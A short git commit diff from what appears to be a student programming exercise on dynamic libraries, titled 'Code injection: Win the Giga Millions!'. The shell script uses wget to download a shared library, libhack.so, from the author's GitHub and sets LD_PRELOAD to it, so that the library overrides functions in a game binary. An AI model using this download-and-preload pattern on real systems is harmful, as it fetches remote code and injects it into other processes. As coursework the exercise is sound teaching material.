03c3732f640c24b1e4f32361973d3028104f42c3
Omosalewa-Akinsete <shaleycoral@gmail.com>
2023-12-14 13:40:56 -0800

    Code injection: Win the Giga Millions!

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,4 @@
 #!/bin/bash
 wget -P .. https://raw.githubusercontent.com/Omosalewa-Akinsete/alx-low_level_programming/master/0x18-dynamic_libraries/libhack.so
-export LD_PRELOAD="$PWD/../libc.so"
+export LD_PRELOAD="$PWD/../libhack.so"
+
